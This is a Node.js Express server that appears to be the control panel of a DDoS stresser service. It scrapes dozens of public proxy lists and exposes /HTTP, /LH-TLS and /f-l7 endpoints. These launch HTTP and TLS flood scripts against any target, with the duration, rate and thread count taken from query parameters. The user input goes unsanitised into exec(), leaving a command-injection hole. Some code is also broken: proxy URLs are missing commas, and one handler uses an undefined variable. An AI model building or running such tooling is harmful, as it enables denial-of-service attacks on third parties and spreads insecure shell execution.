const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const app = express();
const port = 8080;
app.use(express.json());

app.get('/', (req, res) => {
  res.json({ status: 'active',
    available: {
      'HTTP-BYPASS': '/HTTP',
      'LH-TLS': '/LH-TLS',
      'Flood': '/f-l7'
    }
  });
});

// Needed Maybe(?)
const urls = [
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
    'https://sunny9577.github.io/proxy-scraper/generated/socks5_proxies.txt',
    'https://sunny9577.github.io/proxy-scraper/generated/socks4_proxies.txt',
    'https://sunny9577.github.io/proxy-scraper/generated/http_proxies.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/xResults/Proxies.txt',
    'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/proxylist.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt',
    "https://yakumo.rei.my.id/HTTP",
    "https://yakumo.rei.my.id/SOCKS5",
    "https://yakumo.rei.my.id/SOCKS4",
    'http://www.proxy-list.download/api/v1/get?type=http'
    'https://fastly.jsdelivr.net/gh/roosterkid/openproxylist@main/HTTPS_RAW.txt'
    'https://www.proxy-list.download/api/v1/get?type=https'
    'https://fastly.jsdelivr.net/gh/roosterkid/openproxylist@main/SOCKS4_RAW.txt'
    'https://www.proxy-list.download/api/v1/get?type=socks4'
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true'
    'https://caliph.my.id/proxy/socks5.txt'
];

async function Proxies(urls, filename) {
    console.log('Getting Some Proxies..')
    let allProxies = [];
    for (const url of urls) {
        try {
            const response = await axios.get(url);
            const proxies = response.data.split('\n').map(proxy => proxy.trim()).filter(proxy => proxy);
            allProxies = allProxies.concat(proxies);
        } catch (error) {
            console.error(`Error fetching from ${url}:`, error.message);
        }
    }
    try {
        const data = allProxies.join('\n');
        fs.writeFileSync(filename, data, 'utf8');
        console.log(`Proxies saved to ${filename}`);
    } catch (error) {
        console.error(`Error writing to file:`, error.message);
    }
}

// HTTP || Sending big amount Http packet
app.get('/HTTP', (req, res) => {
  const { target, time, rate, threads } = req.query;
  if (!target || !time || !rate || !threads) {
    return res.status(400).json({ error: 'Missing required parameters' });
  }
  exec(`node L7/HTTP.js ${target} ${time} ${rate} ${threads} ./proxy.txt`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return res.status(500).json({ error: error.message });
    }
    if (stderr) {
      console.error(`Stderr: ${stderr}`);
      return res.status(500).json({ error: stderr });
    }
    console.log(`Result:\n ${stdout}`);
    res.json({ message: 'Request executed', target, time, threads });
  });
});

// LH-TLS || Flooding With Big Tls Headers
app.get('/LH-TLS', (req, res) => {
  const { target, time, rate, threads } = req.query;
  if (!target || !time || !threads || !rate) {
    return res.status(400).json({ error: 'Missing required parameters' });
  }
  exec(`node L7/LH-TLS.js ${target} ${time} ${rate} ${threads} ./proxy.txt`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return res.status(500).json({ error: error.message });
    }
    if (stderr) {
      console.error(`Stderr: ${stderr}`);
      return res.status(500).json({ error: stderr });
    }
    console.log(`Result:\n ${stdout}`);
    res.json({ message: 'Request executed', target, time, threads, rate, delay });
  });
});

// f-l7 || Flooding Web L7 With Big Http Headers
app.get('/f-l7', (req, res) => {
  const { target, time, threads, rate, delay } = req.query;
  if (!target || !time || !threads || !rate || !delay) {
    return res.status(400).json({ error: 'Missing required parameters' });
  }
  exec(`node L7/FLOODER.js ${target} ${time} ${threads} ./proxy.txt ${rate} ${delay}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return res.status(500).json({ error: error.message });
    }
    if (stderr) {
      console.error(`Stderr: ${stderr}`);
      return res.status(500).json({ error: stderr });
    }
    console.log(`Result:\n ${stdout}`);
    res.json({ message: 'Request executed', target, time, threads, rate, delay });
  });
});

Proxies(urls, 'proxy.txt');
setInterval(() => {
  Proxies(urls, 'proxy.txt');
  console.log('Success getting Proxy');
}, 3000000);

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});